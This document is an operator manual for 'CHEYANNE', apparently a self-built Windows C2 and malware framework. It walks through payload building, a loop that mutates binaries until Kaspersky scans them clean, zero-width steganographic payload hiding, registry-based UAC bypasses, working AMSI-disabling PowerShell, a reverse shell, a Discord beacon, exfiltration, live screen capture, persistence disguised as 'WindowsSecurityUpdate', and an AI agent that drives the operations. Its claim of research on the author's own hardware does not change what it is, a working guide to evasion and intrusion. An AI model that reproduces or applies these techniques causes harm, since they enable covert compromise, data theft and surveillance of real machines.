```
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║         C H E Y A N N E   C 2   —   F I E L D   M A N U A L             ║
║                                                                           ║
║           OPERATOR: VADER  //  22DIV  //  george wu                       ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

---

# WHO WROTE THIS AND WHY

**Written by:** George Wu (VADER / 22DIV). Sydney, Australia. CSEC academic researcher.

**Inspired by:**
> Cheyanne. Named after someone worth protecting. Every system I've built that refuses to die is because something in me refuses to quit on her. This project carries that forward — the name is on work that can't be erased.

**Who built iron-sun:** George Wu. The recon / field probe arm of this system. Designed to run on a target machine, enumerate its defenses, and report home so CHEYANNE can forge a weapon that fits that exact target.

**What this is:**  
A Windows red team research platform — built from scratch on own hardware to understand and document detection gaps in modern endpoint protection. Every technique in here was built, tested, and verified on George's own machines with Kaspersky Premium and Windows Defender enabled. MSRC disclosure submitted for novel findings (VULN-195458).

**Who is authorized to use this:** George Wu only. Own hardware only. Raed's machine (RADON) with explicit authorization. No unauthorized targets. No mass-targeting. No DoS.

---

# THE ARCHITECTURE — HOW IT ALL FITS TOGETHER

```
IRON-SUN (field probe, runs on target)
          │
          │  recon JSON: OS build, AV version,
          │  disk size, screen res, CPU count,
          │  PS execution policy, EDR presence
          │
          ▼
CHEYANNE (operator console, runs on George's machine)
          │
          ├── auto-selects payload config for that target
          ├── adjusts anti-sandbox thresholds to match target
          ├── builds ghost_iron.exe tuned for that machine
          │
          ▼
GHOST_IRON.EXE (the weapon, delivered to target)
          │
          ├── anti-sandbox checks (timing / screen / disk)
          ├── PE header stomp (kills in-memory scanners)
          ├── optional: magic auth via ISUN (C2 arms it)
          ├── decrypts PS1 payload
          │
          ▼
GHOST_CHEYANNE.PS1 (the payload, runs inside PowerShell)
          │
          ├── AMSI bypass (HWBP / split type names)
          ├── TCP reverse shell → listener.py on :4443
          ├── Discord beacon → SERVITOR channel
          └── persistence (HKCU Run key)
```

**Why iron-sun does recon first:** Different machines have different sandbox fingerprints. If you compile ghost_iron with static thresholds (disk > 50GB, screen > 800px) and the target has a 40GB drive or runs at 768p, the anti-sandbox checks abort the payload thinking it's a VM. Iron-sun reads the actual values from the target machine and feeds them back so CHEYANNE can compile a binary with thresholds that pass on that specific hardware.

---

# PREREQUISITES — WHAT MUST BE INSTALLED

| Requirement | Check | Fix if missing |
|-------------|-------|----------------|
| Python 3.10+ | `python --version` | Download from python.org |
| gcc (MinGW-w64) | `gcc --version` | `winget install MSYS2.MSYS2` then `pacman -S mingw-w64-x86_64-gcc` |
| pip packages | `pip list` | `pip install requests discord.py websockets Pillow` |
| Kaspersky exclusion on `cheyanne\` dir | KAV settings → Threats → Exclusions | Add `C:\Users\gwu07\Desktop\cheyanne` as full path exclusion |
| git | `git --version` | `winget install Git.Git` |
| Port 4443 not blocked by firewall | `netstat -an \| findstr 4443` | Windows Defender Firewall → Inbound → allow TCP 4443 |
| Port 4445 for magic auth | same check | allow TCP 4445 |
| Port 8890 for file server | same check | allow TCP 8890 |

**CRITICAL:** NEVER clone this repo to `Desktop\cheyanne` from scratch if Kaspersky is active. Exclusion must be set first, THEN clone. Kaspersky will scan and delete binaries during git operations if the directory isn't excluded. The 46 compiled binaries are built artifacts — if deleted, rebuild with `[Z] FUD Auto Loop` or `[X] FUD Build`.

---

# STARTING THE PROGRAM

```powershell
cd C:\Users\gwu07\Desktop\cheyanne
python vader_menu.py
```

That's it. No arguments needed. It detects your IP automatically, checks for compiled payloads, reads the current Defender version.

If you see an error on startup:
- `ModuleNotFoundError` → run `pip install <module>` (the name is in the error)
- `OSError: [WinError 10013]` on socket → another process holds port 4443. Kill it: `netstat -ano | findstr 4443` then `taskkill /PID <pid> /F`
- `Permission denied` → run PowerShell as administrator, or check Kaspersky isn't blocking the script

---

# MENU REFERENCE — EVERY OPTION EXPLAINED

## STATUS BAR (top right of BLADE widget)
- **CALLSIGN** — always CHEYANNE v2
- **OPERATOR** — VADER (you)
- **MY IP** — auto-detected local LAN IP (your operator machine)
- **DEFENDER** — Windows Defender version on your machine
- **RECON** — `none` until you run `[Q]` or `[I]`
- **PAYLOAD** — READY = `ghost_fud.exe` exists and was built recently | size and age
- **BEACON** — BUILT = the C-compiled beacon is ready
- **MSRC** — VULN-195458 (your submitted finding)

---

## KILL CHAIN SECTION

### `[Q]` DROP RECON — Run recon_drop.ps1 on target
Runs `recon_drop.ps1` against the target. This PS1 fingerprints the target machine: OS build, AV product, disk size, screen resolution, CPU count, installed software, PS execution policy, whether EDR is present. Saves results as a JSON file. Used by `[I]` to automatically configure the payload for that specific machine.

**When to use:** First step of any operation against a new target machine.

### `[I]` IMPORT RECON — Load recon JSON → auto-select payload config
Reads the JSON produced by `[Q]`. Automatically:
- Sets anti-sandbox thresholds to match the target's actual disk size and screen resolution
- Selects payload obfuscation level based on detected AV (Kaspersky = max obfuscation, Defender only = medium)
- Updates the RECON field in the status bar

**When to use:** After `[Q]` completes and you have the recon JSON.

### `[B]` BUILD PAYLOAD — Auto-build tailored ghost_fud + privesc PS1
Runs the full build pipeline for the current target profile:
1. Generates a fresh PS1 payload (`ghost_cheyanne.ps1`) with AMSI bypass and C2 IP/port embedded
2. Encodes it with zero-width Unicode steganography (invisible in plain text editors)
3. Compiles `ghost_fud.exe` using the C loader + target-tuned thresholds
4. Runs metamorphic transforms (`metamorph.py`) to change structural identity
5. Rotates XOR keys (`mutate.py`) — every binary gets a different key
6. Outputs `ghost_fud.exe` ready for delivery

**When to use:** After `[I]` — or any time you want a fresh build with new keys.

### `[V]` PRIVESC — UAC bypass
Attempts privilege escalation from standard user to admin using one of four methods:
- **fodhelper** — `HKCU\Software\Classes\ms-settings\shell\open\command` bypass
- **eventvwr** — `HKCU\Software\Classes\mscfile\shell\open\command` bypass
- **sdclt** — `HKCU\Software\Classes\exefile\shell\runas\command` bypass
- **auto** — tries each in order until one succeeds

**When to use:** Once you have a session on a standard-user account and want SYSTEM.

### `[P]` PHASE 0 — KAV pause + file server + C2 listener
The main pre-operation setup step. Does three things simultaneously:
1. **KAV pause** — uses `UIA automation` (UIAutomationClient COM) to click through Kaspersky's elevated pause dialog without requiring manual interaction
2. **File server** — starts HTTP server on `:8890` serving the `shell/` directory (so target can download the payload EXE)
3. **C2 listener** — starts `listener.py` on `:4443` (TCP reverse shell receiver)

After this, the target machine can fetch `ghost_fud.exe` from `http://YOUR_IP:8890/ghost_fud.exe` and execute it. When it does, you'll get a shell prompt in the listener.

**When to use:** Before delivering the payload. Run this, then deliver via whatever access vector you have to the target.

### `[W]` WATCH / VNC — Live screenshot stream → browser :8892
Starts a WebSocket server on `:8892`. On the target machine (once you have a session), starts a screenshot loop that sends JPEG frames back. Open `http://localhost:8892` in a browser to see the target's screen live.

**When to use:** After you have an active session and want to watch what the target is doing.

### `[T]` TEST CHAIN — Full automated local kill chain test (8/8)
Runs `test_local_chain.py` against localhost — tests the complete kill chain without a real target:
1. TCP listener armed on :4443
2. Payload launched via -EncodedCommand
3. TCP callback received
4. `whoami` / `hostname` / `$env:COMPUTERNAME` round-trip
5. Persistence set in HKCU Run key
6. Persistence verified from registry

All 8 steps must PASS before any real operation. If any fail, debug the broken step before going live.

**When to use:** After any code change or build. Before any real operation.

### `[K]` SCAN LAN — ARP/TCP scan → find Radon + Verena
Scans the local 192.168.1.x subnet. Identifies:
- Radon_Laptop1 (192.168.1.145) — the authorized test target
- Any other devices (Verena, phones, etc.)
- Open ports on each device

**When to use:** At the start of a session to confirm target IP hasn't changed via DHCP.

---

## BUILD SECTION

### `[F]` FRESH BUILD — Mutate + auto-IP + compile + scan
Full fresh build:
1. Reads current LAN IP automatically
2. Embeds IP:port into PS1 payload and C loader
3. Metamorphic transform (new structural identity)
4. XOR key rotation (new obfuscation keys)
5. Compiles with gcc
6. Scans with Kaspersky MpCmdRun — checks if clean

**When to use:** Start of any new operation. Gets you a current-IP, freshly-mutated binary.

### `[X]` FUD BUILD — Metaorph + mutate — breaks signatures
More aggressive version of `[F]`. Runs metamorph at `--intensity high` before XOR rotation. Changes more: dead code, opaque predicates, function reordering, rolling string encryption. Costs more compile time (~30s vs ~10s) but produces a structurally different binary from last scan.

**When to use:** When Kaspersky starts flagging the current build. The goal of the FUD loop is to mutate until it's clean.

### `[Z]` FUD AUTO LOOP — Loop until Kaspersky CLEAN
Runs `fud_auto.py` — automates `[X]` in a loop. Each iteration:
1. Metamorphic transform (new seed each time)
2. XOR key rotation
3. Compile
4. Kaspersky scan (via MpCmdRun.exe)
5. If CLEAN → stop. If DETECTED → continue loop.

Will keep mutating until Kaspersky gives it a pass. Usually takes 1-3 iterations.

**When to use:** When a build gets flagged and you need it clean fast.

### `[G]` GHOST ENCODE — Steg payload + ghost_loader EXE
The steganography path:
1. Takes the PS1 payload text
2. Encodes it as zero-width Unicode characters (invisible, non-printing)
3. Embeds the invisible payload in a carrier text string
4. Compiles `ghost_loader.exe` — a C binary that reads the carrier string, extracts invisible chars, reconstructs the PS1, and runs it via `powershell -EncodedCommand`

The result looks like normal text to any string scanner but contains a full PS1 payload.

**When to use:** When you need the stealthiest delivery — paste the carrier text in a document, email, whatever. The invisible chars survive plain text copy-paste.

### `[1]` COMPILE ONLY — Build without mutation
Just runs gcc/MSVC. No metamorph, no key rotation. Fast (< 5s). Uses whatever source is current.

**When to use:** When you fixed a bug in source code and just want a new binary without changing the obfuscation.

### `[2]` SCAN ALL — Kaspersky + Defender — all binaries
Runs MpCmdRun.exe scan on every `.exe` in `shell/`. Reports CLEAN or DETECTED for each. Counts: X/46 CLEAN.

**When to use:** After any build. After Kaspersky updates its definitions. Before any operation.

---

## DEPLOY SECTION

### `[D]` C2 SHELL — TCP + Discord dual-channel C2
Starts the full C2 console with both channels active:
- **TCP** — raw socket reverse shell on :4443. Direct, low-latency. Commands go in, output comes back.
- **Discord** — beacon running through SERVITOR's Discord channel. Commands sent as Discord messages. Useful when TCP is blocked or you want async ops.

**When to use:** When the target has executed the payload and you have an active session.

### `[A]` AUTO OP — Full automated Discord → TCP kill chain
Runs `auto_op.py`. Fully automated operation:
1. Waits for target to check in via Discord beacon
2. Issues initial recon commands automatically (whoami, hostname, systeminfo, netstat)
3. Attempts UAC bypass
4. Delivers TCP payload
5. Establishes TCP session
6. Runs persistence

**When to use:** When you want a hands-off operation. Set it running and check Discord for results.

### `[R]` TCP RECONNECT — Re-deliver via Discord beacon (KAV-safe)
If the TCP session drops (target rebooted, session timeout), this re-delivers the payload via the Discord beacon without triggering Kaspersky. Uses the beacon to instruct the target to re-download and re-execute.

**When to use:** When your TCP session dies but the Discord beacon is still alive.

### `[H]` VADER TERMINAL — AI operator — chat + tools
Opens the VADER agent terminal (`vader_agent.py`). AI-powered operator interface — you can issue natural language commands and VADER agent interprets them and runs the appropriate tool. "Check if target is still alive" → runs ping + session check. "Get me a list of running processes" → sends `tasklist` through the active session.

**When to use:** When you want to talk to the system instead of navigating the menu.

---

## OPERATE SECTION (Discord beacon commands)

### `[S]` SESSIONS — List active targets + session IDs
Lists all currently active TCP sessions and Discord beacon check-ins. Shows: session ID, source IP, username, how long it's been connected.

### `[N]` RECON — Full target enumeration via beacon
Runs a recon sweep through the Discord beacon: `whoami /all`, `systeminfo`, `netstat -an`, `tasklist`, `reg query HKLM\SOFTWARE`, directory listings. Saves output to `loot/`.

### `[SC]` SCREENSHOT — Capture target screen via beacon
Instructs the beacon on the target to take a screenshot and base64-encode it back to the listener. Saved to `loot/screenshots/`.

### `[E]` EXFIL — Pull file from target → local loot/
Given a file path on the target, reads the file via the beacon and saves it locally to `loot/`.

### `[U]` UPLOAD — Push file to target
Given a local file path, uploads the file to a specified path on the target via the file server + beacon.

---

# UNDERSTANDING THE CODE — LANGUAGE GUIDE

CHEYANNE is written in three languages. Here's what each one does and how to read it.

## Python (`*.py`)

**What it does:** Everything except the payload and loader. The menu, the listener, the builder, the automation, the AI agent.

**How to read Python in this codebase:**

```python
# Example from listener.py
def handle_session(conn, addr):
    conn.send(b"OK> ")                    # send prompt
    while True:
        cmd = conn.recv(4096).strip()     # read command from shell
        if cmd == b"exit":
            break
        conn.send(b"\n> ")
```

- `def` = function definition. `def foo(bar):` = function named `foo` that takes one argument `bar`
- `conn.recv(4096)` = read up to 4096 bytes from the TCP socket. This is how commands arrive from the target.
- `b"string"` = byte string (raw bytes, not text). Sockets work in bytes, not strings.
- `if x:` = `if x is truthy` (in Python, empty string/list/None = false, everything else = true)
- `while True:` = infinite loop until `break`

**How to edit Python to fix something:**

If a function is broken, find it with `grep -n "def function_name" *.py`. Open in VS Code. Python errors are usually:
- `IndentationError` = whitespace mismatch. Python uses 4 spaces. Don't mix tabs and spaces.
- `SyntaxError: unexpected EOF` = you're missing a closing parenthesis or bracket
- `AttributeError: 'NoneType'` = something returned `None` that you're trying to use. Check what's above the error line.
- `socket.error: [Errno 98] Address already in use` = port is taken. Kill the existing process first.

## C (`*.c`)

**What it does:** The compiled executables — the loader, the shell, the FUD binary. Runs as native Windows PE.

**How to read C in this codebase:**

```c
// Example from ghost_iron.c
static void xor_decrypt(unsigned char *out, const unsigned char *in, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++)
        out[i] = in[i] ^ key;             // XOR each byte with the key
}
```

- `unsigned char *buf` = pointer to a buffer of bytes. In C, strings are just arrays of bytes.
- `^` = XOR operator. `a ^ key` = flip the bits in `a` that are set in `key`. XOR the same key twice = original value (symmetric cipher).
- `GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualAlloc")` = loads a function by name at runtime instead of linking at compile time. This hides the import from static analysis.
- `HANDLE`, `DWORD`, `LPVOID` = Windows API typedefs. `HANDLE` = opaque pointer, `DWORD` = 32-bit unsigned int, `LPVOID` = `void *` (generic pointer).
- `WinMain(HINSTANCE h, HINSTANCE h2, LPSTR cmd, int show)` = Windows entry point (instead of `main`). Used with `-mwindows` compile flag to suppress the console window.

**How to build C after editing:**

```bash
# In shell/ directory
gcc ghost_iron_out.c -o ghost_iron.exe -lws2_32 -lcrypt32 -D_WIN32_WINNT=0x0600 -mwindows
```

- `-lws2_32` = link Winsock2 (needed for socket functions)
- `-lcrypt32` = link Windows Crypto API (needed for `CryptBinaryToStringA`)
- `-D_WIN32_WINNT=0x0600` = target Windows Vista+ API level
- `-mwindows` = no console window

**Common C errors:**
- `undefined reference to 'WSAStartup'` = missing `-lws2_32`
- `implicit declaration of function 'xxx'` = missing `#include`. Check which header defines `xxx` and add it.
- `error: expected ';'` = missing semicolon on the line ABOVE the error (C errors often point one line off)
- Segfault at runtime = pointer is NULL or you wrote past the end of a buffer. Add `printf("here %d\n", __LINE__)` before the crash to narrow it down.

## PowerShell (`*.ps1`)

**What it does:** The payload that runs inside the target's PowerShell. AMSI bypass, TCP reverse shell, persistence.

**How to read PS1 in this codebase:**

```powershell
# Example — AMSI bypass
$a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -match 'AmsiUtils' }
$b = $a.GetField('amsiContext','NonPublic,Static')
$b.SetValue($null, [IntPtr]::Zero)
```

- `[Ref].Assembly.GetTypes()` = reflection to list all loaded .NET types. Used to find internal security classes without importing them by name (evades string-based scanning).
- `Where-Object { $_.Name -match 'AmsiUtils' }` = filter the list to the type named `AmsiUtils` — this is the AMSI implementation class.
- `GetField('amsiContext','NonPublic,Static')` = get the private static field `amsiContext` via reflection.
- `SetValue($null, [IntPtr]::Zero)` = set it to null pointer — zeroes out the AMSI context, disabling scanning for the rest of the session.

The PS1 payload in `ghost_cheyanne.ps1` is NOT in plain text — it's encoded as zero-width Unicode characters. To read/edit it:

```python
# Decode to plain text
python3 - << 'EOF'
content = open('ghost_cheyanne.ps1', encoding='utf-8').read()
# find the zero-width chars
zwc = ['​','‌','‍','⁠','⁡','⁢','⁣','⁤',
       '⁪','⁫','⁬','⁭','⁮','⁯','﻿','᠎']
rev = {c: i for i, c in enumerate(zwc)}
chars = [c for c in content if c in rev]
out = bytes(rev[chars[i]]*16 + rev[chars[i+1]] for i in range(0, len(chars), 2))
print(out.decode('utf-8'))
EOF
```

---

# MUTATION PIPELINE — HOW OBFUSCATION WORKS

When you run `[X] FUD Build` or `[Z] FUD Auto Loop`, this pipeline runs:

```
_annotated.c  (hand-written source with mutation hooks)
      │
      ▼
metamorph.py  (source → source transforms)
  ├── dead code injection
  ├── junk variables
  ├── opaque predicates (1==1 wrappers)
  ├── constant splitting (0x1234 → (0x1200 + 0x34))
  ├── identifier mutation (var names → random)
  ├── function reordering
  ├── rolling string encryption
  └── junk API calls
      │
      ▼
mutate.py  (XOR key rotation)
  ├── generates new random XOR key
  ├── re-encrypts all byte arrays
  └── updates key #define in source
      │
      ▼
gcc compile → new .exe
      │
      ▼
MpCmdRun.exe scan → CLEAN or DETECTED
```

Each loop produces a binary with:
- Different variable names
- Different constants
- Different dead code blocks
- Different XOR key
- Structurally different PE layout

Kaspersky's signature scanner sees a different binary every time. The AV has to retrain its heuristics to detect the new variant.

---

# KILL CHAIN — STEP BY STEP

This is the full operation sequence for hitting Radon_Laptop1 (192.168.1.145) from George's machine (192.168.1.92).

```
STEP 1: Verify target is alive
  [K] Scan LAN → confirm 192.168.1.145 is up

STEP 2: Get recon if first run on this machine
  [Q] Drop Recon → runs recon_drop.ps1 on target
  [I] Import Recon → auto-configures payload for target's profile

STEP 3: Build a fresh payload
  [F] Fresh Build → new keys, new structure, target IP embedded
  [2] Scan All → confirm ghost_fud.exe is CLEAN (should be X/46)
  If DETECTED → run [Z] FUD Auto Loop until CLEAN

STEP 4: Arm Phase 0
  [P] Phase 0 → KAV paused (or excluded), file server :8890, C2 :4443

STEP 5: Deliver payload to target
  (out of band — Discord DM with ghost_fud.exe link, USB, etc.)
  Target fetches: http://192.168.1.92:8890/ghost_fud.exe
  Target executes: .\ghost_fud.exe

STEP 6: Get shell
  [D] C2 Shell → watch for incoming session
  Session arrives: "NEW SESSION <id>  192.168.1.145:PORT  (Radon_Laptop1\raed)"

STEP 7: Operate
  whoami, systeminfo, dir, tasklist, etc.
  [V] Privesc if needed
  [E] Exfil files to loot/
  [SC] Screenshot

STEP 8: Persist
  Payload auto-sets HKCU\Run\WindowsSecurityUpdate on session connect
  Verify: reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

STEP 9: Clean up / reconnect
  [R] TCP Reconnect if session drops
  [0] Exit to close listeners cleanly
```

---

# TROUBLESHOOTING — WHEN THINGS BREAK

## "Kaspersky deleted my binary"

The `cheyanne\` directory must be in the exclusion list **before** you compile or paste any EXE there. If Kaspersky deletes it:
1. Open Kaspersky → Settings → General → Threats → Exclusions
2. Add `C:\Users\gwu07\Desktop\cheyanne` as File/Folder exclusion
3. Rebuild: `[F] Fresh Build` or `[1] Compile Only`

Never try to add `.exe` files while KAV is scanning them. The exclusion must cover the directory, not just the file.

## "ghost_fud.exe is DETECTED"

Run `[Z] FUD Auto Loop`. It will mutate until KAV passes it. Usually 1-3 cycles. If it keeps failing after 5+ cycles, check if a new KAV update came out — the detection rate will reset after mutation creates enough divergence.

## "TCP session never connects"

1. Check listener is actually running: `netstat -an | findstr 4443` → should show `LISTENING`
2. Check target machine firewall: outbound connections on high ports should be unrestricted by default
3. Confirm C2 IP embedded in payload matches current LAN IP: run `[F] Fresh Build` to refresh it
4. Try port 443 or 80 if 4443 is being filtered by a network-level firewall

## "AMSI bypass isn't working / PowerShell terminates immediately"

1. Defender updates sometimes patch the AmsiUtils reflection bypass. Check Defender version.
2. Try HWBP bypass instead — edit `ghost_cheyanne.ps1` to use the hardware breakpoint method:
   ```powershell
   # Hardware breakpoint AMSI bypass
   $context = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(64)
   # ... (see vader_rootkit research for full HWBP implementation)
   ```
3. Use split type names to evade string scanning:
   ```powershell
   $typeName = "System.Management.Auto" + "mation.AmsiUtils"
   ```

## "The menu crashes on startup"

Usually a missing Python package. Check the traceback — last line tells you which module. `pip install <module>`.

If it crashes inside `vader_menu.py` at the RECON section: the `nmap` or `arp-scan` tool isn't installed. Skip by pressing Enter or install with `winget install nmap`.

## "Port already in use"

```powershell
# Find what's holding the port
netstat -ano | findstr :4443
# Output: TCP   0.0.0.0:4443   0.0.0.0:0   LISTENING   <PID>
taskkill /PID <PID> /F
```

If this keeps happening, there's probably a zombie listener.py process from a previous session. `Get-Process python | Stop-Process -Force` to kill all Python processes.

## "ghost_iron ISUN magic auth isn't firing"

1. Make sure `listener.py` was started with `--magic` flag
2. Confirm port 4445 is open: `netstat -an | findstr 4445`
3. Check ghost_iron was compiled with the correct C2_PORT (must be 4445, not 0):
   ```bash
   python shell/make_ghost_iron.py payload.ps1 192.168.1.92 4445 0xCD
   ```
4. The magic trigger ONLY fires after sandbox checks pass. If the target machine fails the anti-sandbox checks (disk < threshold, screen < threshold), ghost_iron exits before trying to connect. Run `[I]` to re-import target recon and rebuild with correct thresholds.

## "gcc not found"

```bash
# Install MinGW-w64 via MSYS2
winget install MSYS2.MSYS2
# Then in MSYS2 terminal:
pacman -S mingw-w64-x86_64-gcc
# Add to PATH: C:\msys64\mingw64\bin
```

Or use MSVC (Visual Studio) — the `build_ghost_loader.py` script will detect it via `cheyanne_config.py::VCVARS`.

---

# HOW TO EDIT THE CODE TO FIX THINGS

## Changing the C2 port

`cheyanne_config.py` line 23:
```python
C2_PORT = 4443   # change this number
```

Then rebuild: `[F] Fresh Build` to embed the new port in the payload and loader.

## Adding a new menu option

In `vader_menu.py`, find the `MENU_OPTIONS` dict or the input handler. Add your key and handler function. Pattern:
```python
'Y': ('My New Option', 'Does something new', do_my_thing),
```
Then define `def do_my_thing():` below.

## Changing anti-sandbox thresholds manually

In `shell/ghost_iron.c`, find `sandbox_ok()`:
```c
// Change these to match your target
if (disk_gb < 50) return 0;    // target has 120GB → change to 100
if (screen_w < 800) return 0;  // target is 1366px wide → fine
```
After editing, rebuild with `[1] Compile Only`.

## Adding a new metamorph transform

In `metamorph.py`, add a new method to the `Metamorph` class. Follow the pattern of existing transforms — they receive a C source string and return a transformed C source string. Then add the method call in `transform()`.

## Fixing the PS1 AMSI bypass after a Defender update

Decode the current `ghost_cheyanne.ps1` using the Python snippet above. Edit the decoded PS1. Then re-encode:
```python
# Re-encode PS1 to zero-width chars
python build_ghost_loader.py --encode-only ghost_cheyanne.ps1
```
Or just run `[B] Build Payload` — it regenerates and re-encodes the PS1 from the template.

---

# PORT REFERENCE

| Port | Service | Notes |
|------|---------|-------|
| 4443 | TCP reverse shell (C2) | Target calls back here. Must be open inbound on operator machine. |
| 4445 | ghost_iron ISUN magic auth | listener.py `--magic` flag. Target connects here for armed trigger. |
| 8890 | File server | HTTP server serving `shell/` directory. Target downloads payload from here. |
| 8891 | Recv port | Internal use (screenshot recv) |
| 8892 | VNC stream | Browser connects here to view live target screen |
| 8666 | UI port | vader_ui.py web interface |
| 8667 | Agent port | vader_agent.py API |

---

# FILE MAP — WHAT EACH FILE DOES

```
cheyanne/
├── vader_menu.py           MAIN MENU — start here
├── cheyanne_config.py      Ports, paths, VS version detection
├── listener.py             TCP C2 listener + ISUN magic auth
├── ghost_cheyanne.ps1      The PS1 payload (zero-width encoded)
├── build_ghost_loader.py   Build script for ghost_loader path
├── mutate.py               XOR key rotation pipeline
├── metamorph.py            Source-to-source C transforms
├── fud_auto.py             Auto-loop: mutate → compile → KAV scan
├── auto_op.py              Full automated kill chain
├── payload_auto.py         Auto payload generation
├── deploy.py               Delivery automation
├── watch_stream.py         VNC frame receiver
├── cheyanne_ops.py         Core operation functions (shared)
├── cheyanne_headless.py    Headless/no-GUI mode
├── cheyanne_agent.py       Agent tools (ops via AI commands)
├── vader_agent.py          VADER AI terminal
├── vader_evolve.py         Self-improvement / adaptive builds
├── test_local_chain.py     8-step local kill chain test
├── test_listener.py        Simulated implant client for testing
├── test_auto_full.py       Full automated test suite
├── test_evasion.py         Evasion technique tests
├── test_verify.py          Persistence verification tests
└── shell/
    ├── ghost_iron.c            Polymorphic PS1 loader (NEW v4)
    ├── make_ghost_iron.py      Build script for ghost_iron
    ├── ghost_loader_template.c PS1 loader template (v3)
    ├── vader_shell.c           Base TCP shell
    ├── vader_shell_annotated.c Mutation-ready version with hooks
    └── vader_shell_live.c      Live-session version
```

---

# GLOSSARY — TERMS USED IN THIS CODEBASE

| Term | Meaning |
|------|---------|
| **C2** | Command and Control — the listener that receives callbacks from deployed payloads |
| **Beacon** | A persistent callback mechanism. Discord beacon = target sends heartbeats via Discord bot |
| **FUD** | Fully Undetectable — a binary that passes AV scanning |
| **Metamorphic** | A binary that changes its structure (code identity) on each build while keeping the same behavior |
| **Polymorphic** | A binary that encrypts its payload differently on each instance |
| **AMSI** | Antimalware Scan Interface — Windows hook that lets AV scan PowerShell/VBA at runtime |
| **AMSI bypass** | Disabling the AMSI hook so PS1 code runs without AV scanning |
| **ETW** | Event Tracing for Windows — Microsoft telemetry used by EDR to log API calls |
| **HWBP** | Hardware Breakpoint — CPU debug registers (DR0-DR3) used to intercept function calls without touching memory |
| **PE header** | The first 0x400 bytes of a Windows EXE — contains the signature (MZ), imports, section table |
| **PE header stomp** | Zeroing out the first 0x400 bytes in memory to kill in-memory MZ/PE scanners |
| **XOR obfuscation** | Encrypting byte arrays with a fixed key. Hides readable strings in `.rdata` from static analysis |
| **IAT** | Import Address Table — the list of DLL functions a PE loads at startup. Static analysis reads this to find suspicious APIs |
| **Dynamic API resolution** | Loading API functions via `GetProcAddress` at runtime instead of importing them — empties the IAT |
| **Anti-sandbox** | Checks that abort the payload if it detects it's running in a VM or sandbox (small disk, low screen res, fast sleep) |
| **Zero-width steganography** | Encoding binary data as invisible Unicode characters embedded in text. Bypasses string-based payload detection |
| **ISUN magic auth** | The 4-byte sequence `{0x49,0x53,0x55,0x4E}` = "ISUN" that the listener sends to arm ghost_iron's payload |
| **Jitter** | A random delay before a network operation to avoid timing-based sandbox detection |
| **Session** | An active TCP connection from a target machine back to the C2 listener |
| **Loot** | Files or data extracted from the target machine |
| **Persistence** | Code that survives reboot — in this codebase, via `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |

---

```
╔═══════════════════════════════════════════════════════════════════════════╗
║   AUTHORED BY GEORGE WU  //  22DIV  //  CSEC RESEARCH  //  OWN HARDWARE  ║
║   NAMED AFTER CHEYANNE — THE DEDICATION IS REAL                           ║
║   "THE HUNT NEVER ENDS."                                                  ║
╚═══════════════════════════════════════════════════════════════════════════╝
```
